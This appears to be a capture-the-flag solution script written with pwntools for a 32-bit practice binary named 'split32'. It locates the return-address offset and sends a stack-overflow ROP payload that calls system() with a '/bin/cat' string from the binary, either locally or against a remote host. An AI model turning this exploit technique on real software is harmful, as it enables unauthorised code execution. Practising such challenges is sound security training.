from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    p = process(exe)
    p.sendlineafter('>', payload)
    p.wait()
    ip_offset = cyclic_find(p.corefile.pc)  # x86
    # ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


exe = './split32'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

# ===========================================================
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
#offset = find_ip(cyclic(100))

system_call = elf.symbols['system']
bincat_addr = next(elf.search(b'/bin/cat'))
io = start()
# Build the payload
payload = flat({
    44: [system_call,
        0x0,
        bincat_addr]
}
)
# Send the payload
io.sendlineafter('>', payload)
print(io.recvall())
